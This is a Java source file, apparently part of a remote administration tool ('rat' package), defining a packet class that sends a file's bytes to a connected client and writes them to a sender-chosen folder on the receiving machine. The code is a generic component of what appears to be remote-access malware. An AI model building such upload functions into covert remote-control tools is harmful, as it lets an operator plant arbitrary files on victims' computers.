package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class UploadFilePacket implements IPacket {
	
	private byte[] data;
	private String folderPath, fileName;
	
	public UploadFilePacket(final String filePath, final String folderPath) {
		this.folderPath = folderPath;
		
		final File file = new File(filePath);
		
		data = FileUtils.readExternalData(filePath);
		fileName = file.getName();
	}
	
	public UploadFilePacket(final File file, final String folderPath) {
		this(file.getAbsolutePath(), folderPath);
	}
	
	public UploadFilePacket() {
		folderPath = fileName = "";
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeInt(data.length);
		client.write(data);
		client.writeUTF(folderPath);
		client.writeUTF(fileName);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		final int length = client.readInt();
		
		data = new byte[length];
		
		client.read(data);
		
		folderPath = client.readUTF();
		fileName = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final File folder = new File(folderPath);
		
		String path = null;
		
		if (folder.isDirectory()) {
			path = folderPath + File.separator + fileName;
		} else {
			final File parent = folder.getParentFile();
			
			if (parent != null) {
				path = parent.getAbsolutePath() + File.separator + fileName;
			}
		}
		
		if (path != null) {
			FileUtils.writeData(path, data);
		}
	}
	
}
